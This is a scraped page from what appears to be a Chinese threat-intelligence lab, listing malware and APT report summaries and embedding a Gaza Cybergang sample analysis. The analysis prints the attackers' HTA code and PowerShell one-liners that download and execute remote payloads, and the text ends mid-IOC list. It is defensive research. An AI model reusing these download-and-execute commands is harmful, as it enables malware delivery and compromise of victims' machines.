src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2017-06-06 , admin ,专题报告</div><div class="brief" data-v-4113267b>2017年6月1日，Checkpoint发布了文章`FIREBALL – The Chinese Malware of 250 Million Computers Infected`，涉及一款被其命名为FireBall的流氓软件，声称在全球感染了近2亿5千万的机器。报告认为这次感染事件的源头是一家注册于中国北京的名为Rafotech的科技公司，其使用Fireball软件修改用户的Chrome浏览器的默认搜索引擎，将用户的默认搜索指向该公司自己的搜索页面并将用户的查询重定向到yahoo\.com或者google\.com的页面。这个转向搜索页面可能会用来收集用户的个人信息，此外，报告中认为Fireball有可能被用来下载更多的木马程序。 <a href="/articles/fireball-adware-analysis" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/08/01/02ab341818fe9bcd6efc88d8bcd65feb.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/resurface-of-oceanlotus" tag="div" data-v-552f8598>海莲花重出水面</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>OCEANLOTUS<p class="tag" data-v-53a17526>海莲花<p class="tag" data-v-53a17526>APT</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-07-18 , admin ,专题报告</div><div class="brief" data-v-4113267b>APT相关的活动事实上是情报战在网络空间的延伸，其中很大部分属于国家级的对抗，我们的攻击者很多在国门之外，对其的打击已超出了相对简单的技术对抗的范畴。而如果不能从组织和人员的层面上解决问题，那么公开的揭露只会促使其采用的新攻击方式的缓解措施而已，过不多久攻击就会改头换面卷土重来。现实验证了我们的推断，从天眼实验室跟踪的多个APT团伙及其活动来看，从未有什么团伙在被揭露以后而全面停止活动的，从未。在发布海莲花报告一年多的今天，我们也一直在持续监测着海莲花团伙的活动，从未间断，而更多监控能力的引入使我们把对手的活动看得更清晰。最近的大网数据显示在4月份就发生了数百例新的感染，威胁丝毫没有出现缓解的迹象，本文会通过介绍一个真实的案例来展现相关的细节。 <a href="/articles/resurface-of-oceanlotus" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/08/01/d989344e7ac3d3447ca4c4ff74ceb210.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/hworm-malware" tag="div" data-v-552f8598>H-WORM：简单而活跃的远控木马</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>HWORM</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-07-10 , admin ,专题报告</div><div class="brief" data-v-4113267b>远控类木马的活动一直是360天眼实验室的关注重点，近期我们的天眼设备发现了如下一组看起来非常眼熟的被访问的链接。URL的模式非常明显：免费动态域名+非知名的端口+“/is-ready” 。 <a href="/articles/hworm-malware" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/08/01/e3c37af797ae3d864e14f3e178ef86d5.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/pakistan-targeted-apt-campaign" tag="div" data-v-552f8598>针对巴基斯坦的某APT活动事件分析</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>APT<p class="tag" data-v-53a17526>PAKISTAN</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-06-23 , admin ,专题报告</div><div class="brief" data-v-4113267b>2017年6月， 360威胁情报中心发现了一份可疑的利用漏洞执行恶意代码的Word文档，经过分析后，我们发现这有可能是一起针对巴基斯坦的政府官员的APT攻击事件，释放出来的载荷会收集受害者的键盘记录和重要软件密码、文档等。本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。 <a href="/articles/pakistan-targeted-apt-campaign" class="href" data-v-4113267b>阅读全文</a></div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="http://w-lab01.skyeye.shbt.qihoo.net:12312/uploads/2017/08/01/847ba7154379f2cd5d13599b5f1023bf.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-552f8598 data-v-4113267b><a href="/articles/CVE-2014-6352-and-targeted-attack-sample" tag="div" data-v-552f8598>CVE-2014-6352漏洞及定向攻击样本分析</a></div><div class="tags" data-v-53a17526 data-v-4113267b><p class="tag" data-v-53a17526>CVE-2014-6352</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-06-15 , admin ,专题报告</div><div class="brief" data-v-4113267b>近期360天眼实验室捕获到一例针对印度的定向攻击样本，样本利用了沙虫漏洞的补丁绕过漏洞CVE-2014-6352，经分析确认后我们认为这是趋势科技在今年三月份发布的名为“Operation C-Major”APT攻击活动的新样本。关于C-Major行动的相关内容，有兴趣的读者可以在文后的参考链接中查看。本文主要对CVE-2014-6352漏洞做基本的分析并剖析一个现实中利用此漏洞执行定向攻击的案例。 <a href="/articles/CVE-2014-6352-and-targeted-attack-sample" class="href" data-v-4113267b>阅读全文</a></div></div></div></div><div class="paging" data-v-a7c4b6ea><a href="/" class="left pag-btn btn-unable" data-v-a7c4b6ea>上一页 </a><a href="/pages/1" class="right pag-btn btn-unable" data-v-a7c4b6ea>下一页</a><div class="mid" data-v-a7c4b6ea>第 1/1 页</div></div></div></div><div class="tag" data-v-83f11450 data-v-6762fd4c><div class="tag-header" data-v-83f11450><div class="tag-header h-left h-chosen" data-v-83f11450>标签</div><div class="tag-header h-right" data-v-83f11450>类别</div></div><div class="tag-body" data-v-83f11450><ul class="tag-list" data-v-83f11450><li class="tag-item item-chosen" data-v-83f11450><a data-v-83f11450>全部</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>APT</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>暗云</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>暗云3</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>海莲花</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>OCEANLOTUS</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DARKCLOUD</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DARKHOTEL</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>PAKISTAN</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>ADWARE</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>PETYA</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>CVE-2014-6352</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>OFFICE</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>GAZA</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DOCX</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>MBR</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>HWORM</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>TEMPLATE INJECTION</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>FIN7</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>BACKDOOR</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>FIREBALL</a></li><!----><!----><!----></ul></div></div></div></section></div></div><script type="text/javascript">window.__NUXT__={layout:"default",data:[{tagAllList:[[{tag:"全部"},{title:["Gaza Cybergang APT团伙新样本分析","FIN7 APT组织攻击木马分析报告","针对巴基斯坦的某APT活动事件分析","DarkHotel定向攻击样本分析","海莲花重出水面"],articleId:["597733a71c670a09e493ee37","597733a71c670a09e493ee3a","597733a71c670a09e493ee3d","597733a71c670a09e493ee3e","597733a71c670a09e493ee3c"],count:5,tag:"APT"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"暗云"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"暗云3"},{title:["海莲花重出水面"],articleId:["597733a71c670a09e493ee3c"],count:1,tag:"海莲花"},{title:["海莲花重出水面"],articleId:["597733a71c670a09e493ee3c"],count:1,tag:"oceanlotus"},{title:["暗云III木马技术分析报告"],articleId:["597733a71c670a09e493ee3f"],count:1,tag:"DarkCloud"},{title:["DarkHotel定向攻击样本分析"],articleId:["597733a71c670a09e493ee3e"],count:1,tag:"DarkHotel"},{title:["针对巴基斯坦的某APT活动事件分析"],articleId:["597733a71c670a09e493ee3d"],count:1,tag:"Pakistan"},{title:["浏览器变造者流氓推广软件分析"],articleId:["597733a71c670a09e493ee3b"],count:1,tag:"adware"},{title:["Petya变种勒索蠕虫启动代码分析"],articleId:["597733a71c670a09e493ee40"],count:1,tag:"petya"},{title:["CVE-2014-6352漏洞及定向攻击样本分析"],articleId:["596f0ad74337d4596e59ed0b"],count:1,tag:"CVE-2014-6352"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"Office"},{title:["Gaza Cybergang APT团伙新样本分析"],articleId:["597733a71c670a09e493ee37"],count:1,tag:"gaza"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"docx"},{title:["Petya变种勒索蠕虫启动代码分析"],articleId:["597733a71c670a09e493ee40"],count:1,tag:"mbr"},{title:["H-WORM：简单而活跃的远控木马"],articleId:["597733a71c670a09e493ee39"],count:1,tag:"HWorm"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁"],articleId:["5968a01f5704074e282bcdde"],count:1,tag:"template injection"},{title:["FIN7 APT组织攻击木马分析报告"],articleId:["597733a71c670a09e493ee3a"],count:1,tag:"Fin7"},{title:["FIN7 APT组织攻击木马分析报告"],articleId:["597733a71c670a09e493ee3a"],count:1,tag:"Backdoor"},{title:["浏览器变造者流氓推广软件分析"],articleId:["597733a71c670a09e493ee3b"],count:1,tag:"FireBall"}],[{category:"全部"},{title:["Template Injection 攻击事件: 隐藏在模板文件后的威胁","CVE-2014-6352漏洞及定向攻击样本分析","Gaza Cybergang APT团伙新样本分析","H-WORM：简单而活跃的远控木马","FIN7 APT组织攻击木马分析报告","浏览器变造者流氓推广软件分析","针对巴基斯坦的某APT活动事件分析","DarkHotel定向攻击样本分析","海莲花重出水面","暗云III木马技术分析报告","Petya变种勒索蠕虫启动代码分析"],articleId:["5968a01f5704074e282bcdde","596f0ad74337d4596e59ed0b","597733a71c670a09e493ee37","597733a71c670a09e493ee39","597733a71c670a09e493ee3a","597733a71c670a09e493ee3b","597733a71c670a09e493ee3d","597733a71c670a09e493ee3e","597733a71c670a09e493ee3c","597733a71c670a09e493ee3f","597733a71c670a09e493ee40"],count:11,category:"专题报告"},{title:["威胁情报的层次分析"],articleId:["597733a71c670a09e493ee38"],count:1,category:"安全观点"}],{success:!0,msg:[{_id:"597733a71c670a09e493ee37",title:"Gaza Cybergang APT团伙新样本分析",author:"admin",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" data-line="2">2017年6月下旬， 360威胁情报中心发现了Gaza Cybergang APT事件的新样本，其特点是恶意代码完全使用网上流行的标准攻击框架Cobalt Strike生成，配合CVE-2017-0199漏洞通过鱼叉邮件投递，本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。</p>\n<h2 class="line" data-line="4">样本分析</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>004ef1209458bf6056147d1ce001fe9d</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>2.5 MB (2592858 bytes)</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>رارات اللجنة المركزية.doc （中央委员会的决定.doc）</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="13">该文档所利用的漏洞为CVE-2017-0199，该漏洞利用OFFICE OLE对象链接技术，将包裹的恶意链接对象嵌在文档中，OFFICE调用<a href="https://msdn.microsoft.com/en-us/library/ms775149%28v=vs.85%29.aspx">URL Moniker</a>（COM对象）将恶意链接指向的HTA文件下载到本地， <a href="https://msdn.microsoft.com/en-us/library/ms775149%28v=vs.85%29.aspx">URL Moniker</a>通过识别响应头中content-type的字段信息最后调用mshta.exe将下载到的HTA文件执行起来。</p>\n<p class="text-center line" data-line="15"><img src="/uploads/2017/07/25/2c6c046e1469061df944b8d6b626a9e8.png" alt="" width="90%"></p>\n<p class="line" data-line="17">可以看到下载地址为http://138[.]68.242.68:820/word.hta</p>\n<p class="line" data-line="19">Hta的代码如下：</p>\n<pre class="hljs"><code class="hljs">a=new ActiveXObject(\'WScript.Shell\');\n\na.run(\'%windir%\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString(\\\'https://gist.githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1\\\')"\', 0, true);\n\nwindow.close();\n</code></pre>\n<p class="line" data-line="29">其会启用powershell去下载:</p>\n<p class="line" data-line="31">https://gist[.]githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1</p>\n<p class="line" data-line="33">1.ps1其实也是一个downloader,从https://drive[.]google.com/uc?export=download&amp;id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU下载一个PE文件并保存为%appdata%目录下的ps.exe。</p>\n<pre class="hljs"><code class="hljs">powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile(\'https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU\',"$env:APPDATA\\ps.exe"\\);Start-Process ("$env:APPDATA\\ps.exe")\n</code></pre>\n<p class="line" data-line="39">ps.exe是一个sfx文件，解压出来notepad.exe是一个dropper，其会在temp目录释放一个powershell脚本，然后以<code>&quot;C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe&quot; -noProfile -ExecutionPolicy Bypass -File &quot;C:\\Documents and Settings\\Administrator\\Local Settings\\Temp\\3A.tmp\\3B.ps1&quot;</code>执行该脚本。</p>\n<p class="text-center line" data-line="41"><img src="/uploads/2017/07/25/15b019813d9e6141c0e6613cb2a2f14b.png" alt="" width="90%"></p>\n<p class="line" data-line="43">Powershell脚本的功能也非常简单，将内置的字符串base64decode后，得到一个PE文件（beacon_dll.dll），然后CreateThread一个新线程，将这个dll加载起来。</p>\n<p class="line" data-line="45">beacon_dll.dll是使用cobalt strike攻击框架生成的标准攻击载荷。其使用了一种叫做Reflective Load的技术，也就是在PE头部插入shellcode并实现一个模拟加载dll的导出函数，在shellcode中调用该导出函数将自身加载进来，并以fdwReason = 4来调用DllMain，这样做的好处有两个：</p>\n<ol>\n<li>可以直接将dll当成shellcode加载\\注入到内存中从MZ头开始执行；</li>\n<li>正常地加载dll不会执行到功能流程（因为在MSDN中指明了fdwReason的值只能为0、1、2、3）。</li>\n</ol>\n<p class="line" data-line="50">MZ头部的shellcode如下：</p>\n<p class="text-center line" data-line="52"><img src="/uploads/2017/07/25/7cdd85072c838392e04111126d73d632.png" alt="" width="90%"></p>\n<p class="line" data-line="54">实现自加载的导出函数的校验PE头部分代码：</p>\n<p class="text-center line" data-line="56"><img src="/uploads/2017/07/25/f2a186ca6c79f8af69415eb81d031579.png" alt="" width="90%"></p>\n<p class="line" data-line="58">DllMain中代码：</p>\n<p class="text-center line" data-line="60"><img src="/uploads/2017/07/25/82809a34c05d0f327c3bd5b33fd0e99e.png" alt="" width="90%"></p>\n<p class="line" data-line="62">可以看到，只有在fdwReason == 4时才会进入真正的功能流程，进入该流程后，首先将数据节偏移为 0x2E040，大小为 0x610的数据解密，解密方式是xor 0x69, 解密出的数据中包含了C&amp;C， lol[.]mynetav.org。</p>\n<p class="text-center line" data-line="64"><img src="/uploads/2017/07/25/0a7801660bd57492afc18b7bfa30ccfc.png" alt=""></p>\n<p class="line" data-line="66">然后开始连接C&amp;C服务器，这里支持dns_text,http,smb,tcp等多种协议的通信方式：</p>\n<p class="text-center line" data-line="68"><img src="/uploads/2017/07/25/6b55fb43a9e99442972c250752cda50a.png" alt=""></p>\n<p class="text-center line" data-line="70"><img src="/uploads/2017/07/25/46b35f1a964950a8beca926fe2de433f.png" alt="" width="90%"></p>\n<p class="line" data-line="72">最后进入的就是远控功能部分了，由于是Cobalt Strike生成的标准载荷，功能包括显示应用信息、显示机器的凭证信息，文件下载，查看事件日志，键盘记录，获取代理信息，屏幕截图，加载脚本等等..... 具体功能就不再分析了。</p>\n<h2 class="line" data-line="74">扩展与关联分析</h2>\n<p class="line" data-line="76">使用360威胁情报中心的<a href="http://ti.360.com">威胁情报平台</a>对样本连接的C&amp;C地址（138.68.242.68）做进一步关联，发现了一个新的样本：</p>\n<p class="text-center line" data-line="78"><img src="/uploads/2017/07/25/eb821528a0dd812e962cb8ca362d4584.png" alt="" width="90%"></p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>87a67371770fda4c2650564cbb00934d</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>2.5 MB (2592858 bytes)</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>محضر اجتماع مركزية فتح الليلة.doc （中心开幕之夜的会议纪要.doc）</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="89">该样本与上面提到的样本几乎完全一致，只是连接的url变成了http://138[.]68.242.68:808/word.hta</p>\n<p class="line" data-line="91">另外我们发现lol.mynetav.org解析到的ip地址就是138.68.242.68，并且有一个域名<a href="https://www.passivetotal.org/search/ksm5sksm5sksm5s.zzux.com">ksm5sksm5sksm5s.zzux.com</a>也解析到了这个ip上，而<a href="https://www.passivetotal.org/search/ksm5sksm5sksm5s.zzux.com">ksm5sksm5sksm5s.zzux.com</a>这个域名，是Gaza Cybergang攻击事件（Gaza Cybergang APT活动是在2015年9月被Kaspersky公开揭露出来的一个APT组织，最早的活动可以追溯到2012年。相关行动的主要使用的攻击方式：鱼叉邮件，涉及行业：政治，受影响国家：埃及、阿联酋、也门）的其中一个C&amp;C。 综合上面提到的文档标题、内容和来源，我们认为这次事件应该是Gaza Cybergang APT活动的又一次攻击活动。</p>\n<h2 class="line" data-line="93">IOC</h2>\n<table>\n<thead>\n<tr>\n<th><strong>文件名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>محضر اجتماع مركزية فتح الليلة.doc</td>\n</tr>\n<tr>\n<td>رارات اللجنة 